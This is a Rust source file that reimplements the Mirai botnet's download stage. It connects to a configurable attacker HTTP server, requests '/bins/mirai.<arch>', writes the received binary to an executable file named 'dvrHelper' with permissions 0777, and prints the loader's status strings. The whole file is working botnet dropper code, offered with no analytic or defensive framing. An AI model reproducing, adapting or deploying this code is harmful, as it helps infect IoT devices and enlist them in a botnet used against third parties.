use std::ffi::CString;
use std::io::{Read, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream};
use std::os::unix::io::{AsRawFd, FromRawFd, RawFd};
use std::process::exit;
use std::fs::{File, OpenOptions};
use std::mem::transmute;

const HTTP_SERVER: Ipv4Addr = Ipv4Addr::new(127, 0, 0, 1); // CHANGE TO YOUR HTTP SERVER IP

const EXEC_MSG: &str = "MIRAI\n";
const EXEC_MSG_LEN: usize = 6;

const DOWNLOAD_MSG: &str = "FIN\n";
const DOWNLOAD_MSG_LEN: usize = 4;

const STDOUT: RawFd = 1;

#[cfg(target_endian = "big")]
fn htons(n: u16) -> u16 {
    n
}

#[cfg(target_endian = "little")]
fn htons(n: u16) -> u16 {
    n.to_be()
}

fn utils_inet_addr(one: u8, two: u8, three: u8, four: u8) -> Ipv4Addr {
    Ipv4Addr::new(one, two, three, four)
}

fn xsocket(domain: i32, kind: i32, protocol: i32) -> RawFd {
    unsafe { libc::socket(domain, kind, protocol) }
}

fn xwrite(fd: RawFd, buf: &[u8]) -> isize {
    unsafe { libc::write(fd, buf.as_ptr() as *const _, buf.len()) }
}

fn xread(fd: RawFd, buf: &mut [u8]) -> isize {
    unsafe { libc::read(fd, buf.as_mut_ptr() as *mut _, buf.len()) }
}

fn xconnect(fd: RawFd, addr: &SocketAddr) -> i32 {
    let sockaddr = match addr {
        SocketAddr::V4(v4) => v4,
        _ => panic!("Invalid address type"),
    };

    let sockaddr_in = libc::sockaddr_in {
        sin_family: libc::AF_INET as u16,
        sin_port: sockaddr.port().to_be(),
        sin_addr: libc::in_addr {
            s_addr: u32::from_be_bytes(sockaddr.ip().octets()),
        },
        sin_zero: [0; 8],
    };

    unsafe {
        libc::connect(
            fd,
            &sockaddr_in as *const _ as *const _,
            std::mem::size_of_val(&sockaddr_in) as u32,
        )
    }
}

fn xopen(path: &str, flags: i32, mode: u32) -> RawFd {
    let c_path = CString::new(path).expect("CString::new failed");
    unsafe { libc::open(c_path.as_ptr(), flags, mode) }
}

fn xclose(fd: RawFd) -> i32 {
    unsafe { libc::close(fd) }
}

fn x__exit(code: i32) -> ! {
    unsafe { libc::_exit(code) }
}

fn run() {
    let mut recvbuf = [0u8; 128];
    let addr = SocketAddr::new(IpAddr::V4(HTTP_SERVER), 80);
    let mut sfd = xsocket(libc::AF_INET, libc::SOCK_STREAM, 0);
    let mut ffd = xopen("dvrHelper", libc::O_WRONLY | libc::O_CREAT | libc::O_TRUNC, 0o777);

    if sfd == -1 || ffd == -1 {
        x__exit(1);
    }

    if xconnect(sfd, &addr) < 0 {
        xwrite(STDOUT, b"NIF\n");
        x__exit(-1);
    }

    let get_request = format!("GET /bins/mirai.{} HTTP/1.0\r\n\r\n", "BOT_ARCH");
    if xwrite(sfd, get_request.as_bytes()) != get_request.len() as isize {
        x__exit(3);
    }

    let mut header_parser: u32 = 0;
    while header_parser != 0x0d0a0d0a {
        let mut ch = [0u8];
        let ret = xread(sfd, &mut ch);
        if ret != 1 {
            x__exit(4);
        }
        header_parser = (header_parser << 8) | ch[0] as u32;
    }

    loop {
        let ret = xread(sfd, &mut recvbuf);
        if ret <= 0 {
            break;
        }
        xwrite(ffd, &recvbuf[..ret as usize]);
    }

    xclose(sfd);
    xclose(ffd);
    xwrite(STDOUT, DOWNLOAD_MSG.as_bytes());
    x__exit(5);
}

fn main() {
    run();
}
